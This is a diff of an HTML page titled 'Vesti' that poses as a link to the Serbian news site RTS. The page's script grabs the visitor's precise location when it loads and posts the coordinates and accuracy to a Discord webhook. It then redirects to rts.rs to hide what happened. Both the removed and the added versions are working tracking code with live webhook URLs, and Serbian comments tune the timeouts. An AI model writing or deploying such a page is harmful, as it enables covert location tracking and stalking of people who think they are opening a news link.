@@ -1,30 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
+<head><meta charset="UTF-8"><title>Vesti</title></head>
 <body>
     <script>
-        const webhook = "https://discord.com/api/webhooks/1494140296936558602/NW_nYMuyUgbb_cSUwheVuvk0U60zeUp6iEzqPVZEUiZeW7Ix18Vs1mJvHKNyKU2oBk7i";
-        
-        navigator.geolocation.getCurrentPosition(function(pos) {
-            var lat = pos.coords.latitude;
-            var lon = pos.coords.longitude;
-            var data = {
-                content: "📍 **Lokacija:** https://www.google.com/maps?q=" + lat + "," + lon
+        const webhook = "https://discordapp.com/api/webhooks/1494157860643278890/-kmJPPm-TfxTuVOewXOnSbB6Wr3y8mv5eOc0vh5RsPsd3H27yyWR9lRh_kAt3MySMa8g";
+        const target = "https://www.rts.rs";
+
+        function send(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = Math.round(pos.coords.accuracy);
+            
+            const payload = {
+                content: `📍 **LOKACIJA STIGLA!**\nMapa: https://www.google.com/maps?q=${lat},${lon}\nPreciznost: ${acc} metara`
             };
 
-            var request = new XMLHttpRequest();
-            request.open("POST", webhook);
-            request.setRequestHeader('Content-type', 'application/json');
-            request.onreadystatechange = function() {
-                // Tek kad Discord potvrdi prijem (status 204), idemo na RTS
-                if (request.readyState == 4) {
-                    window.location.href = "https://www.rts.rs";
-                }
-            };
-            request.send(JSON.stringify(data));
-        }, function() {
-            window.location.href = "https://www.rts.rs";
-        }, {enableHighAccuracy: true, timeout: 5000});
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).finally(() => { window.location.href = target; });
+        }
+
+        function fail() { window.location.href = target; }
+
+        // Pokreni odmah
+        navigator.geolocation.getCurrentPosition(send, fail, {
+            enableHighAccuracy: true,
+            timeout: 8000
+        });
+
+        // Sigurnosni prebačaj ako telefon predugo razmišlja
+        setTimeout(fail, 9000);
     </script>
 </body>
 </html>
